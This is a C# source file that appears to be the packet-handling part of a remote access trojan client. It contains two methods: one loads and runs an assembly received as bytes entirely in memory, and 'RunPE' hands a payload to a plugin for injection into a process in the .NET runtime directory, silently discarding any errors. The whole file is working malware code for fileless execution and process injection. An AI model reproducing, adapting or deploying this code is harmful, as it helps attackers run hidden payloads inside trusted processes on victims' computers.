using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace Client.Handle_Packet
{
    class SendToMemory
    {
        public static void Reflection(object obj)
        {
            object[] parameters = (object[])obj;
            byte[] buffer = (byte[])parameters[0];
            Assembly loader = Assembly.Load(buffer);
            object[] parm = null;
            if (loader.EntryPoint.GetParameters().Length > 0)
            {
                parm = new object[] { new string[] { null } };
            }
            loader.EntryPoint.Invoke(null, parm);
        }

        public static void RunPE(object obj)
        {
            try
            {
                object[] parameters = (object[])obj;
                byte[] file = (byte[])parameters[0];
                string injection = Convert.ToString(parameters[1]);
                byte[] plugin = (byte[])parameters[2];
                Assembly loader = Assembly.Load(plugin);
                loader.GetType("Plugin.Program").GetMethod("Run").Invoke(null, new object[] { file, Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), injection) });
            }
            catch { }
        }
    }
}
